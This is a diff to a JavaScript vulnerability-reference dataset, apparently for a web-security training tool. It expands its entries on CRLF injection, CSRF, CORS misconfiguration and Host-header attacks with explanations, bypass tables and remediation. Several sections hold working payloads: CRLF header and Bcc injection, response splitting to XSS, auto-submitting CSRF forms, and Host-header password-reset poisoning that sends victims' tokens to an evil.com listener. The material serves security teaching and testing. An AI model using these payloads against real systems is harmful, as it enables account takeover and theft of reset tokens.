@@ -227,37 +227,71 @@ var VULNS = [
         "severity": "Medium",
         "ref": "https://owasp.org/www-community/vulnerabilities/CRLF_Injection",
         "description": "Unsanitised newline characters (CR / LF) in user input are written into HTTP headers or other structured output, letting an attacker inject headers or split the response.",
-        "brief": "HTTP headers are separated by CRLF (\\r\\n, or %0d%0a URL-encoded). When a value the user controls — a redirect target, a cookie, an email field — is placed into a header without stripping newlines, an attacker can inject their own headers or split the message entirely. Depending on where the sink is, this becomes response header injection, response splitting, cookie injection, log forging, or — in email flows — SMTP header injection to add a hidden CC/BCC.\n\nImpact ranges from adding an attacker CC to a password-reset email, to setting cookies, to XSS and cache poisoning via a split response.",
+        "brief": "CRLF injection abuses the fact that many text-based protocols use the carriage-return + line-feed sequence (\\r\\n, URL-encoded %0d%0a) as a structural delimiter. In HTTP, headers are separated from each other by CRLF, and a blank line (a double CRLF, %0d%0a%0d%0a) separates the headers from the body. When user-controlled input — a redirect target, a cookie value, a reflected header, an email field — is written into that structured output without stripping newlines, the attacker can insert new lines and therefore new headers, or terminate the header section entirely and control the body.\n\nWhat the injection becomes depends on the sink. Into an HTTP response header it is response header injection (add arbitrary headers, set cookies for session fixation) and, if a double CRLF lands, HTTP response splitting — inject a whole second response body for reflected XSS and web-cache poisoning. Into an email built from form input (contact/reset forms) it is SMTP/email header injection — add a hidden Cc/Bcc to receive a copy of a victim's password-reset token, or spoof headers. Into a log file it is log forging — inject fake or misleading log lines.\n\nImpact therefore ranges from a hidden Bcc on a reset email (account takeover), through cookie planting and cache poisoning, to reflected XSS via a split response. Modern servers/frameworks increasingly reject bare CR/LF in header values, which has reduced classic HTTP response splitting, but email-header injection and application-level sinks remain common.",
         "quickReference": [
           { "label": "Header injection", "cmd": "param=value%0d%0aX-Injected:%20true" },
           { "label": "Set a cookie", "cmd": "param=value%0d%0aSet-Cookie:%20sessionid=attacker" },
-          { "label": "Email CC injection (reset flows)", "cmd": "email=victim@mail.com%0d%0acc:attacker@mail.com" },
-          { "label": "Open redirect + split", "cmd": "?url=%0d%0aLocation:%20https://evil.com" }
+          { "label": "Response split -> XSS", "cmd": "param=x%0d%0a%0d%0a<script>alert(1)</script>" },
+          { "label": "Email Bcc injection (reset flows)", "cmd": "email=victim@mail.com%0d%0abcc:attacker@mail.com" }
         ],
         "sections": [
-          { "title": "How It's Exploited", "type": "commands", "commands": [
-            { "label": "1. Find a value reflected into a header", "cmd": "# redirects (Location), Set-Cookie, custom headers, and any 'echo the input' header\ncurl -si 'https://target/redirect?url=test' | grep -i location" },
-            { "label": "2. Inject a newline and a header", "cmd": "curl -si 'https://target/redirect?url=test%0d%0aX-Injected:%20yes'\n# X-Injected present in the response = CRLF injection" },
-            { "label": "3. Escalate the sink", "cmd": "# Set-Cookie:  ...%0d%0aSet-Cookie:%20sessionid=attacker   (session fixation)\n# full body:   ...%0d%0a%0d%0a<script>alert(1)</script>       (response splitting -> XSS)\n# cache:       poison a cached response with attacker headers/body" },
-            { "label": "4. SMTP header injection in mail flows", "cmd": "# a reset/contact form that builds mail headers from input:\nemail=victim@mail.com%0d%0acc:attacker@mail.com\n# you receive a copy of the victim's reset token" }
+          { "title": "Root Cause & Concepts", "type": "notes", "items": [
+            "CR (%0d, \\r) and LF (%0a, \\n) are structural delimiters in HTTP and SMTP; when user input carrying them is written into a header/message without sanitisation, the attacker controls structure, not just data.",
+            "A single CRLF injects a new header line; a double CRLF (%0d%0a%0d%0a) ends the header block and lets you inject a full body (HTTP response splitting).",
+            "The sink defines the vulnerability: HTTP header -> header injection / splitting / cookie planting; email builder -> SMTP header injection; log writer -> log forging.",
+            "It is a delimiter-injection cousin of XSS/SQLi — the fix is the same principle: never let control characters from input reach a structured output unescaped.",
+            "Encodings matter: %0d%0a, and sometimes %E5%98%8A%E5%98%8D (unicode) or bare \\n, may slip past filters that only strip one form."
+          ]},
+          { "title": "Where to Look", "type": "notes", "items": [
+            "Redirects: any endpoint that echoes a parameter into the Location header (?url=, ?next=, ?returnTo=).",
+            "Cookie setters: values reflected into Set-Cookie.",
+            "Reflected/custom response headers: X-*, Content-Location, Link, or any header built from input.",
+            "Email flows: contact, invite, password-reset, and 'share by email' forms whose To/Cc/Subject/From are built from input.",
+            "Log lines that include raw user input (log forging), and any other CRLF-delimited output the app generates."
+          ]},
+          { "title": "Step 1 — Detect the Injection", "type": "commands", "commands": [
+            { "label": "Find a value reflected into a header", "cmd": "# redirects, Set-Cookie, and any header that echoes input\ncurl -si 'https://target/redirect?url=test' | grep -i '^location'" },
+            { "label": "Inject a newline + a marker header", "cmd": "curl -si 'https://target/redirect?url=test%0d%0aX-Injected:%20yes'\n# X-Injected present in the RESPONSE headers = CRLF injection confirmed" },
+            { "label": "Try encoding variants if filtered", "cmd": "%0d%0a        # standard\n%0a           # LF only (some servers accept)\n%0d           # CR only\n%E5%98%8A%E5%98%8D   # unicode CR/LF (certain stacks normalise to \\r\\n)\n\\r\\n literal in JSON bodies" }
+          ]},
+          { "title": "Step 2 — Escalate by Sink", "type": "commands", "commands": [
+            { "label": "Cookie planting / session fixation", "cmd": "?url=test%0d%0aSet-Cookie:%20sessionid=attacker-known-value\n# the victim's browser stores the attacker's session id (see Session Fixation)" },
+            { "label": "HTTP response splitting -> XSS", "cmd": "# double CRLF ends the headers, then inject your own body:\n?url=x%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(document.domain)</script>\n# reflected XSS even where the value never lands in the HTML body normally" },
+            { "label": "Web-cache poisoning", "cmd": "# combine a split response with a cacheable URL so victims are served your body\n# or inject caching headers to poison the stored response" },
+            { "label": "SMTP / email header injection", "cmd": "# a reset/contact form building mail headers from input:\nemail=victim@mail.com%0d%0abcc:attacker@mail.com\n# you receive a copy of the victim's reset token -> account takeover\n# also inject Subject/From to spoof mail" }
           ]},
           { "title": "Sinks & Effects", "type": "table", "columns": ["Sink", "Effect"], "rows": [
             ["Location header (redirect)", "Header injection, open redirect, response splitting"],
             ["Set-Cookie", "Session fixation, cookie tampering"],
             ["Reflected custom header", "Cache poisoning, client-side attacks"],
-            ["Email headers (To/CC/Subject)", "SMTP injection — hidden CC/BCC, spoofed mail"],
-            ["Log files", "Log forging / injection to hide or fake activity"]
+            ["Response body (double CRLF)", "Reflected XSS via HTTP response splitting"],
+            ["Email headers (To/Cc/Subject)", "SMTP injection — hidden Bcc, token theft, spoofed mail"],
+            ["Log files", "Log forging / injection to hide or fabricate activity"]
+          ]},
+          { "title": "Impact & Attack Chain", "type": "table", "columns": ["Step", "Action", "Result"], "rows": [
+            ["1", "Find input reflected into a header/email/log", "Candidate CRLF sink"],
+            ["2", "Inject %0d%0a + a marker", "Injection confirmed"],
+            ["3", "Escalate per sink", "Cookie planting / XSS / cache poisoning / Bcc"],
+            ["4", "Chain (e.g. Bcc reset token)", "Account takeover or wider client-side attack"]
+          ]},
+          { "title": "Tools Used", "type": "table", "columns": ["Tool", "Purpose"], "rows": [
+            ["Burp Suite", "Manual injection into headers/redirects and inspecting raw responses"],
+            ["curl -si", "Quick header-reflection and injection probing"],
+            ["Nuclei (crlf templates)", "Automated CRLF-injection detection at scale"],
+            ["crlfuzz", "Dedicated CRLF-injection fuzzer"]
           ]},
           { "title": "References", "type": "references", "items": [
             { "label": "OWASP — CRLF Injection", "url": "https://owasp.org/www-community/vulnerabilities/CRLF_Injection" },
-            { "label": "OWASP — HTTP Response Splitting", "url": "https://owasp.org/www-community/attacks/HTTP_Response_Splitting" }
+            { "label": "OWASP — HTTP Response Splitting", "url": "https://owasp.org/www-community/attacks/HTTP_Response_Splitting" },
+            { "label": "PayloadsAllTheThings — CRLF Injection", "url": "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection" }
           ]},
           { "title": "Remediation", "type": "notes", "items": [
-            "Strip or reject CR (%0d) and LF (%0a) — and their encoded/overlong variants — from any value that reaches a header, cookie, redirect, email field, or log line.",
-            "Use framework APIs that build headers and set cookies safely rather than string-concatenating raw values.",
-            "Prefer allow-list validation for redirect targets and email addresses over blocklist filtering.",
-            "Keep modern web servers/frameworks updated — most now reject bare CR/LF in header values by default.",
-            "Encode data written into logs so injected newlines cannot forge log entries."
+            "Strip or reject CR (%0d/\\r) and LF (%0a/\\n) — and their encoded and unicode variants — from any value that reaches a header, cookie, redirect target, email field, or log line.",
+            "Use framework APIs that build headers, set cookies, and construct emails safely (which reject embedded newlines) rather than string-concatenating raw input.",
+            "Prefer strict allow-list validation for redirect targets and email addresses over blocklist filtering.",
+            "Keep web servers and frameworks updated — most modern ones reject bare CR/LF in header values by default; do not disable that.",
+            "Encode/escape user data written into logs so injected newlines cannot forge log entries.",
+            "For email, use a library that separates headers from body and validates address fields, and never place raw user input into header lines."
           ]}
         ]
       },
@@ -1259,23 +1293,54 @@ var VULNS = [
         severity: "Medium",
         ref: "https://portswigger.net/web-security/csrf",
         description: "A malicious site causes the victim's browser to send an authenticated state-changing request they never intended.",
-        brief: "CSRF abuses the browser's habit of attaching cookies to every request to a site, regardless of who initiated it. If a state-changing action relies only on the session cookie for authorization, an attacker can host a page that silently submits that request from the victim's authenticated browser — changing their email, password, or settings.\n\nImpact: account takeover and unwanted state changes performed as the victim. It requires no XSS and no credential theft; it simply rides the victim's existing session. The defence is an unpredictable, per-request token a cross-site attacker cannot know.",
+        brief: "Cross-Site Request Forgery exploits a fundamental browser behaviour: cookies (including session cookies) are attached to every request to a site, no matter which site initiated the request. If a state-changing action authorises the user solely on that ambient cookie — with no unpredictable value the attacker cannot know — then a page the attacker controls can cause the victim's browser to send that authenticated request without the victim's intent. The server sees a perfectly valid, cookie-authenticated request and performs the action as the victim.\n\nThree conditions must hold for a classic CSRF: a relevant action worth forging (change email/password, transfer funds, change a setting or role); cookie-based session handling with no additional unpredictable token; and request parameters the attacker can determine in advance. Delivery is a hidden auto-submitting HTML form for POST, or a mere <img>/<link> for GET actions.\n\nCrucially, CSRF needs no XSS and no stolen credentials — it rides the session the victim already holds. Modern browsers' default SameSite=Lax cookie behaviour blocks much naive cross-site POST delivery, which has reduced but not eliminated CSRF: gaps remain around GET-based state changes, SameSite=None cookies, method/же content-type tricks, sites that set no SameSite on older stacks, and same-site (subdomain) attackers. The canonical impact is account takeover via 'change email → password reset', and any unwanted state change performed as the victim. The robust defence is an unpredictable, session-bound anti-CSRF token plus SameSite cookies.",
         quickReference: [
-          { label: "Auto-submitting form (concept)", cmd: "<form action=//target/change-email method=POST>\n <input name=email value=attacker@evil>\n</form><script>document.forms[0].submit()</script>" },
-          { label: "Test: remove the token", cmd: "Strip the CSRF token/param — if the action still succeeds, it's vulnerable" },
-          { label: "Test: swap the token", cmd: "Use another user's/session's token — if accepted, it isn't bound to the session" },
-          { label: "Check", cmd: "Is the action protected only by a cookie? Is SameSite set? Is the token validated?" }
+          { label: "Auto-submitting form (POST)", cmd: "<form action=//target/change-email method=POST><input name=email value=atk@evil></form><script>document.forms[0].submit()</script>" },
+          { label: "GET action", cmd: "<img src=\"https://target/account/delete?confirm=true\">" },
+          { label: "Test: remove / swap the token", cmd: "strip it, empty it, or use another session's token — still accepted = vulnerable" },
+          { label: "Check", cmd: "cookie-only auth? SameSite set? token validated & session-bound?" }
         ],
         sections: [
           {
-            title: "How It's Exploited",
+            title: "Root Cause & Concepts",
+            type: "notes",
+            items: [
+              "Browsers send a site's cookies with any request to that site, regardless of the originating page — so a cookie alone cannot prove the user intended the request. That ambient authority is the root cause.",
+              "CSRF requires: a valuable state-changing action, cookie-based auth with no unpredictable token, and predictable parameters.",
+              "The defence works by requiring something the cross-site attacker cannot supply: a secret per-session token, or a browser guarantee (SameSite) that the cookie won't ride a cross-site request.",
+              "SameSite=Lax (now default in major browsers) blocks cross-site cookies on POST/most subrequests but STILL sends them on top-level GET navigations — so GET state-changes remain forgeable, as do sites using SameSite=None.",
+              "Same-site attackers (an XSS or a subdomain takeover) can defeat SameSite, and CSRF chains powerfully with those and with login-CSRF."
+            ]
+          },
+          {
+            title: "Where to Look",
+            type: "notes",
+            items: [
+              "Sensitive state-changing endpoints: change email/password, add/change payment or payee, change role/permissions, delete account, disable 2FA, update settings.",
+              "Actions authorised by a cookie with no CSRF token, or where the token looks static/global rather than per-session.",
+              "GET requests that change state (still forgeable even under SameSite=Lax).",
+              "JSON APIs that also accept form-encoded bodies, and endpoints honouring method-override headers.",
+              "Login and logout (login CSRF), and any flow chainable to takeover (email change -> reset)."
+            ]
+          },
+          {
+            title: "Step 1 — Find & Test the Control",
             type: "commands",
             commands: [
-              { label: "1. Find a state-changing request with weak protection", cmd: "# capture a sensitive action (change email/password, transfer, role change)\nPOST /account/change-email  email=user@corp\n# is it authorised by the session cookie alone, with no unguessable token?" },
-              { label: "2. Test whether the anti-CSRF control actually holds", cmd: "# remove the token entirely           -> still works?  vulnerable\n# use a token from another session     -> accepted?     not session-bound\n# change POST to GET                    -> honoured?     method not enforced\n# empty the token value                -> accepted?     validated only for presence" },
-              { label: "3. Build the forged request as an auto-submitting form", cmd: "<html><body>\n <form action=\"https://target/account/change-email\" method=\"POST\">\n   <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">\n </form>\n <script>document.forms[0].submit()</script>\n</body></html>" },
-              { label: "4. GET-based actions are even simpler", cmd: "# if a GET changes state, an <img> tag alone fires it on page load:\n<img src=\"https://target/account/delete?confirm=true\">" },
-              { label: "5. Deliver and chain", cmd: "# host the page and lure the authenticated victim to it\n# chain: CSRF the email to one you control -> trigger password reset -> account takeover" }
+              { label: "Capture a state-changing request", cmd: "POST /account/change-email\nCookie: session=...\ncsrf=abc123&email=user@corp\n# is it authorised by the cookie alone, with no unguessable token?" },
+              { label: "Probe the anti-CSRF control", cmd: "# remove the token entirely            -> still works? vulnerable\n# empty the token value                -> accepted? presence-only check\n# use a token from ANOTHER session      -> accepted? not session-bound\n# use a valid token from your OWN old req -> reused? not per-request where required" },
+              { label: "Method & content-type tricks", cmd: "# change POST -> GET                    -> honoured? forgeable via <img>\n# add X-HTTP-Method-Override: POST on a GET\n# switch application/json -> text/plain or form-encoded to dodge a JSON-only check\n# (text/plain, application/x-www-form-urlencoded, multipart are 'simple' -> no preflight)" },
+              { label: "Defeat Referer/Origin checks", cmd: "# suppress Referer: <meta name=referrer content=no-referrer>\n# lax substring check: place target.com in a path/subdomain you control\n#   Referer: https://attacker.com/target.com   or  https://target.com.attacker.com" }
+            ]
+          },
+          {
+            title: "Step 2 — Build & Deliver the PoC",
+            type: "commands",
+            commands: [
+              { label: "POST via auto-submitting form", cmd: "<html><body>\n <form action=\"https://target/account/change-email\" method=\"POST\">\n   <input type=\"hidden\" name=\"email\" value=\"attacker@evil.com\">\n </form>\n <script>document.forms[0].submit()</script>\n</body></html>" },
+              { label: "GET via an image tag", cmd: "# fires automatically on page load, no JS needed:\n<img src=\"https://target/account/delete?confirm=true\">" },
+              { label: "Form with enctype for pseudo-JSON", cmd: "# smuggle a JSON-ish body through a form to hit an endpoint that only\n# loosely checks content-type:\n<form action=... method=POST enctype=text/plain>\n <input name='{\"email\":\"atk@evil.com\",\"ignore\":\"' value='\"}'>\n</form>" },
+              { label: "Deliver and chain", cmd: "# host the page and lure the authenticated victim (link, ad, stored on the site)\n# chain: CSRF the email to one you control -> trigger password reset -> takeover" }
             ]
           },
           {
@@ -1283,21 +1348,23 @@ var VULNS = [
             type: "table",
             columns: ["Weak defence", "Bypass"],
             rows: [
-              ["Token not validated", "Remove it entirely and see if the request still works"],
-              ["Token not tied to session", "Use a token from another account"],
-              ["Token only on POST", "Try the same action as GET"],
-              ["Method check only", "Override with X-HTTP-Method-Override or a different verb"],
-              ["Referer check", "Suppress the Referer (meta referrer) or match a lax substring check"]
+              ["Token not validated", "Remove it entirely; empty value"],
+              ["Token not tied to session", "Use a valid token from another account"],
+              ["Token only checked on POST", "Perform the action as GET"],
+              ["Method check only", "X-HTTP-Method-Override / different verb"],
+              ["JSON-only content-type check", "Send form-encoded / text/plain (simple request, no preflight)"],
+              ["Referer/Origin substring check", "target.com in an attacker path/subdomain, or suppress Referer"],
+              ["Double-submit cookie", "If the token cookie is settable via a subdomain/injection, forge both halves"]
             ]
           },
           {
-            title: "Attack Chain",
+            title: "Impact & Attack Chain",
             type: "table",
             columns: ["Step", "Action", "Result"],
             rows: [
               ["1", "Find a cookie-authorised state change", "Candidate CSRF target"],
-              ["2", "Confirm the token is missing/weak", "Forgeable request"],
-              ["3", "Host an auto-submitting page", "Request fires from victim's session"],
+              ["2", "Confirm the token is missing/weak/bypassable", "Forgeable request"],
+              ["3", "Host an auto-submitting page and lure the victim", "Request fires from the victim's session"],
               ["4", "Change email/password, then reset", "Account takeover"]
             ]
           },
@@ -1306,28 +1373,31 @@ var VULNS = [
             type: "table",
             columns: ["Tool", "Purpose"],
             rows: [
-              ["Burp Suite", "Generate CSRF PoCs, test token validation logic"],
+              ["Burp Suite (Generate CSRF PoC)", "Auto-build the PoC HTML and test token-validation logic"],
               ["Browser + custom HTML", "Host and deliver the forged request"],
-              ["XSStrike / manual", "Chain with XSS to defeat token protection"]
+              ["Burp Repeater", "Systematically test remove/empty/swap/method/content-type bypasses"],
+              ["XSS (when present)", "Chain to read the token and defeat token protection entirely"]
             ]
           },
           {
             title: "References",
             type: "references",
             items: [
-              { label: "PortSwigger — CSRF", url: "https://portswigger.net/web-security/csrf" },
-              { label: "OWASP — CSRF Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" }
+              { label: "PortSwigger — CSRF (with labs)", url: "https://portswigger.net/web-security/csrf" },
+              { label: "OWASP — CSRF Prevention Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html" },
+              { label: "OWASP WSTG — Testing for CSRF", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery" }
             ]
           },
           {
             title: "Remediation",
             type: "notes",
             items: [
-              "Use anti-CSRF tokens: unpredictable, per-session (or per-request), validated server-side, and bound to the user's session.",
-              "Set SameSite=Lax (or Strict) on session cookies — it blocks most cross-site request delivery by default in modern browsers.",
-              "For sensitive actions, re-authenticate or require a second factor.",
-              "Prefer framework-provided CSRF protection over hand-rolled checks; Referer/Origin checks are a weaker fallback.",
-              "Do not rely on custom request headers alone unless you also enforce CORS correctly."
+              "Use anti-CSRF tokens that are unpredictable, tied to the user's session, validated server-side on every state-changing request, and not accepted from another session — prefer the synchronizer-token pattern via your framework.",
+              "Set SameSite=Lax (or Strict) on session cookies as defence-in-depth; do not use SameSite=None without a strong token, and remember Lax still permits top-level GET.",
+              "Never perform state changes on GET; require POST/PUT/DELETE and validate the token on all of them (do not exempt any method).",
+              "Validate the content type / reject unexpected types so form-encoded/text-plain CSRF cannot reach a JSON handler; if using custom-header defence, enforce it strictly with correct CORS.",
+              "For high-value actions (password/email change, payments, disabling 2FA) require re-authentication or a second factor.",
+              "Prefer framework-provided CSRF protection over hand-rolled checks; treat Referer/Origin validation as a secondary, strictly-matched fallback only."
             ]
           }
         ]
@@ -1338,14 +1408,36 @@ var VULNS = [
         severity: "Medium",
         ref: "https://portswigger.net/web-security/cors",
         description: "An over-permissive cross-origin policy lets a malicious site read authenticated responses from the target.",
-        brief: "CORS controls which origins may read responses from a cross-origin request. Misconfigured, it hands that permission to attackers — most commonly by reflecting the request's Origin header into Access-Control-Allow-Origin while also allowing credentials, which lets any site make authenticated requests and read the responses.\n\nImpact: theft of session-bound data, tokens, and PII directly from authenticated API responses. Unlike CSRF (which can send but not read), a CORS misconfiguration leaks the response body to an attacker-controlled page.",
+        brief: "The Same-Origin Policy (SOP) stops a page on origin A from reading responses it makes to origin B. Cross-Origin Resource Sharing (CORS) is the controlled relaxation of SOP: the server returns Access-Control-Allow-Origin (ACAO) to tell the browser which origin(s) may read its responses, and Access-Control-Allow-Credentials (ACAC) to say whether cookies/credentials may be included. A CORS misconfiguration is any policy that grants that read permission too broadly.\n\nThe critical, classic mistake is reflecting the request's Origin header straight back into ACAO while also setting ACAC: true. That combination tells the browser 'whatever origin asked may read this authenticated response with the victim's cookies' — i.e. any attacker site can make credentialed requests to the target's API and read the results. Related patterns: trusting Origin: null (reachable from a sandboxed iframe or data: URL), weak allow-list logic (naive startsWith/endsWith/substring matches that pass target.com.evil.com or eviltarget.com), and trusting all subdomains (so a single XSS on any subdomain reads everything cross-origin).\n\nThe distinction from CSRF matters: CSRF can SEND an authenticated request but cannot read the response; a CORS misconfiguration lets the attacker READ the response body. Impact is theft of session-bound data, CSRF tokens, API keys, and PII straight from authenticated endpoints — often chainable to full account takeover. (Note the browser blocks ACAO:* combined with credentials, so real exploits rely on reflected/allow-listed specific origins.)",
         quickReference: [
           { label: "The dangerous combo", cmd: "Access-Control-Allow-Origin: <reflected origin>\nAccess-Control-Allow-Credentials: true" },
-          { label: "Test: reflected origin", cmd: "Send  Origin: https://evil.com  — is it echoed back in ACAO?" },
-          { label: "Test: null origin", cmd: "Origin: null  — accepted? Reachable from a sandboxed iframe" },
-          { label: "Weak regex", cmd: "Origin: https://target.com.evil.com  or  https://eviltarget.com — does a substring match pass?" }
+          { label: "Test: reflected origin", cmd: "send  Origin: https://evil.com  — is it echoed back in ACAO?" },
+          { label: "Test: null origin", cmd: "Origin: null  — accepted? reachable from a sandboxed iframe" },
+          { label: "Weak match", cmd: "Origin: https://target.com.evil.com / https://eviltarget.com — does a substring check pass?" }
         ],
         sections: [
+          {
+            title: "Root Cause & Concepts",
+            type: "notes",
+            items: [
+              "SOP blocks cross-origin reads by default; CORS re-grants them via response headers, so the vulnerability is the server granting read access to an origin it should not trust.",
+              "The lethal combination is ACAO set to an attacker-controllable value AND ACAC: true — that authorises a credentialed cross-origin read of authenticated data.",
+              "Reflecting the Origin header into ACAO is the most common cause: it effectively trusts every origin while appearing to name a specific one.",
+              "Browsers refuse ACAO:* together with credentials, so exploitable cases use a reflected origin, a whitelisted origin the attacker can reach (a subdomain via XSS/takeover), or Origin: null.",
+              "CORS is NOT an access-control or CSRF defence — it governs who may READ a response in a browser, not who may authenticate or send a request."
+            ]
+          },
+          {
+            title: "Where to Look",
+            type: "notes",
+            items: [
+              "Authenticated JSON/API endpoints that return session-bound data (account details, tokens, PII, CSRF tokens).",
+              "Any response carrying Access-Control-Allow-Origin — inspect whether it reflects the request Origin and whether ACAC: true accompanies it.",
+              "SPAs and mobile back-ends that enable CORS broadly to support many front-end origins.",
+              "Endpoints trusting all subdomains (*.target.com) — pair with a subdomain XSS or takeover.",
+              "APIs that accept Origin: null, and internal APIs exposed with permissive CORS."
+            ]
+          },
           {
             title: "How It's Exploited",
             type: "commands",
@@ -2631,37 +2723,70 @@ var VULNS = [
         "severity": "Medium",
         "ref": "https://portswigger.net/web-security/host-header",
         "description": "The application trusts the client-supplied Host (or X-Forwarded-Host) header to build URLs or route logic, enabling poisoning and token theft.",
-        "brief": "The HTTP Host header is attacker-controllable, yet many applications reuse it to build absolute URLs — most damagingly the link in a password-reset email. If the reset URL is constructed from the Host or X-Forwarded-Host header, an attacker can request a reset for a victim while supplying their own host, so the email arrives with a link (carrying the victim's valid token) pointing at the attacker's server. The token leaks the moment the victim clicks.\n\nOther impacts include web-cache poisoning, routing to an unintended virtual host, and Host-based access-control bypass.",
+        "brief": "The HTTP Host header tells a server which site the client wants, but it is fully attacker-controllable — it is just a header in the request. Trouble arises when the application reuses that value for anything security-relevant: building absolute URLs, routing, cache keys, or access decisions. The value the developer assumes is 'our domain' is whatever the attacker typed.\n\nThe highest-impact case is password-reset poisoning. If the reset email's link is built from the Host (or an override header like X-Forwarded-Host), an attacker requests a reset for a victim while supplying their own host. The system generates a valid reset token for the victim but emails a link pointing at the attacker's server — so the moment the victim clicks, their token arrives in the attacker's logs, yielding account takeover. Even without a click, some flows fetch or embed the poisoned URL.\n\nOther impacts: web-cache poisoning (a Host-derived absolute URL/resource cached and served to other users), routing/virtual-host confusion to reach internal or unintended apps (see Virtual Host Misconfiguration), Host-based access-control bypass (spoofing an 'internal'/trusted host to reach restricted areas), and SSRF-style server callbacks to an attacker host. Testing hinges on override-header variants and ambiguous Host handling because front-ends and back-ends often disagree on which Host wins.",
         "quickReference": [
-          { "label": "Password-reset poisoning", "cmd": "POST /reset  Host: evil.com        # reset link emailed to the victim points at evil.com" },
-          { "label": "Override header variant", "cmd": "X-Forwarded-Host: evil.com   (also X-Host, X-Forwarded-Server, Forwarded)" },
-          { "label": "Duplicate / ambiguous Host", "cmd": "Host: target.com\\r\\nHost: evil.com   (front-end reads one, back-end the other)" },
-          { "label": "Absolute-URL request line", "cmd": "GET https://target.com/  with  Host: evil.com" }
+          { "label": "Password-reset poisoning", "cmd": "POST /forgot-password  Host: evil.com  -> reset link emailed to victim points at evil.com" },
+          { "label": "Override header variants", "cmd": "X-Forwarded-Host / X-Host / X-Forwarded-Server / Forwarded: host=evil.com" },
+          { "label": "Duplicate / ambiguous Host", "cmd": "two Host headers, or absolute request line + Host, so front-end and back-end disagree" },
+          { "label": "Cache poisoning", "cmd": "poison a Host-derived absolute URL on a cacheable page" }
         ],
         "sections": [
-          { "title": "How It's Exploited", "type": "commands", "commands": [
-            { "label": "1. Confirm the Host is reflected / used", "cmd": "curl -s https://target/ -H 'Host: evil.com' | grep -i 'evil.com'\n# reflected into a link, redirect, or absolute URL = candidate" },
-            { "label": "2. Poison a password reset", "cmd": "POST /forgot-password HTTP/1.1\nHost: evil.com\n\nemail=victim@target.com\n# the victim receives a reset mail whose link is https://evil.com/reset?token=<victim token>" },
-            { "label": "3. Try override headers when Host is validated", "cmd": "POST /forgot-password HTTP/1.1\nHost: target.com\nX-Forwarded-Host: evil.com\n\nemail=victim@target.com" },
-            { "label": "4. Capture the token", "cmd": "# run a listener on evil.com; when the victim clicks, the token hits your logs:\n# GET /reset?token=eyJ...  -> use it to set the victim's password" }
+          { "title": "Root Cause & Concepts", "type": "notes", "items": [
+            "The Host header is client input; using it (or X-Forwarded-Host) to build URLs, route, key caches, or make access decisions trusts attacker-controlled data.",
+            "Password-reset poisoning is the flagship: the token generated is valid for the victim, but the LINK domain comes from the attacker's Host, so the victim's click delivers the token to the attacker.",
+            "Override headers matter because reverse proxies commonly rewrite Host and pass the original in X-Forwarded-Host, and apps often prefer the override — so even a validated Host can be bypassed via the override.",
+            "Front-end/back-end disagreement (duplicate Host, absolute request-line + Host, line-wrapped Host) lets you show one host to the proxy and another to the app.",
+            "The safe design never derives security-relevant values from the request Host — it uses a server-configured canonical domain."
+          ]},
+          { "title": "Where to Look", "type": "notes", "items": [
+            "Password-reset and email-verification flows — inspect whether the emailed link's domain follows a spoofed Host/X-Forwarded-Host.",
+            "Any absolute URL the app emits (canonical links, redirects, password-reset, share links, script/style src) that could be Host-derived.",
+            "Cacheable pages whose content includes a Host-derived resource or link (cache poisoning).",
+            "Routing and access decisions that branch on Host (internal vs external, admin vhost).",
+            "Endpoints behind a proxy that forwards X-Forwarded-Host / Forwarded — test those override headers specifically."
+          ]},
+          { "title": "Step 1 — Confirm Host Is Trusted", "type": "commands", "commands": [
+            { "label": "Reflection probe", "cmd": "curl -s https://target/ -H 'Host: evil.com' | grep -i 'evil.com'\n# reflected into a link, canonical tag, redirect, or absolute URL = candidate\n# also check the response still returns the app (not a 400) with a spoofed Host" },
+            { "label": "Try override headers", "cmd": "curl -s https://target/ -H 'Host: target.com' -H 'X-Forwarded-Host: evil.com' | grep -i evil.com\n# also X-Host, X-Forwarded-Server, X-Original-Host, Forwarded: host=evil.com" },
+            { "label": "Ambiguous / duplicate Host", "cmd": "# send two Host headers, or an absolute request line with a different Host,\n# so the front-end validates one and the back-end uses the other:\nGET https://target.com/ HTTP/1.1\nHost: evil.com" }
+          ]},
+          { "title": "Step 2 — Exploit", "type": "commands", "commands": [
+            { "label": "Password-reset poisoning", "cmd": "POST /forgot-password HTTP/1.1\nHost: evil.com\n\nemail=victim@target.com\n# victim receives a reset mail whose link is https://evil.com/reset?token=<victim token>" },
+            { "label": "Override-header variant (when Host is validated)", "cmd": "POST /forgot-password HTTP/1.1\nHost: target.com\nX-Forwarded-Host: evil.com\n\nemail=victim@target.com" },
+            { "label": "Capture the token", "cmd": "# run a listener on evil.com; when the victim clicks, the token hits your logs:\n# GET /reset?token=eyJ...  -> use it to set the victim's password" },
+            { "label": "Cache poisoning with a spoofed Host", "cmd": "# if a cacheable page reflects the Host into an absolute resource URL,\n# poison it so other users load attacker-controlled script/links" }
           ]},
           { "title": "Impacts", "type": "table", "columns": ["Abuse", "Result"], "rows": [
             ["Password-reset poisoning", "Reset token leaked -> account takeover"],
-            ["Web-cache poisoning", "Malicious absolute URLs served to other users"],
+            ["Web-cache poisoning", "Malicious absolute URLs/resources served to other users"],
             ["Routing / vhost confusion", "Reach an internal or unintended application"],
             ["Host-based auth bypass", "Spoof a trusted host to reach restricted areas"],
             ["SSRF-style callbacks", "Coerce server-side requests to an attacker host"]
           ]},
+          { "title": "Impact & Attack Chain", "type": "table", "columns": ["Step", "Action", "Result"], "rows": [
+            ["1", "Spoof Host / X-Forwarded-Host and observe reflection", "Host is trusted somewhere"],
+            ["2", "Request a reset for the victim with your Host", "Valid token, attacker-domain link emailed"],
+            ["3", "Victim clicks the poisoned link", "Token delivered to attacker"],
+            ["4", "Use the token", "Account takeover"]
+          ]},
+          { "title": "Tools Used", "type": "table", "columns": ["Tool", "Purpose"], "rows": [
+            ["Burp Suite", "Tamper Host/override headers, craft ambiguous requests"],
+            ["Burp Param Miner", "Discover which override headers the app honours"],
+            ["curl", "Quick Host / X-Forwarded-Host reflection probing"],
